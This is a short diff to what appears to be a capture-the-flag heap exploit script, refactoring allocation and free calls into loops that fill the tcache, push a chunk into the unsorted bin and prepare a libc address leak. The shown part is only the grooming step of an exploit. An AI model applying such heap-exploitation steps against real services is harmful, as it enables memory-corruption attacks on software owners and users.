@@ -69,24 +69,12 @@ def main():
     io = connect()
 
     # fill tcache and create a chunk in unsorted bin
-    add(io, 0x90, b"")  # 0
-    add(io, 0x90, b"")  # 1
-    add(io, 0x90, b"")  # 2
-    add(io, 0x90, b"")  # 3
+    for _ in range(8):
+        add(io, 0x90, b"")
+        continue
 
-    add(io, 0x90, b"")  # 4
-    add(io, 0x90, b"")  # 5
-    add(io, 0x90, b"")  # 6
-    add(io, 0x90, b"")  # 7
-
-    free(io, 7)
-    free(io, 6)
-    free(io, 5)
-    free(io, 4)
-    free(io, 3)
-    free(io, 2)
-    free(io, 1)
-    free(io, 0)
+    for i in range(7,-1,-1):
+        free(io, i)
 
     # leak libc base
     add(io, 0x90, b"")  # 8
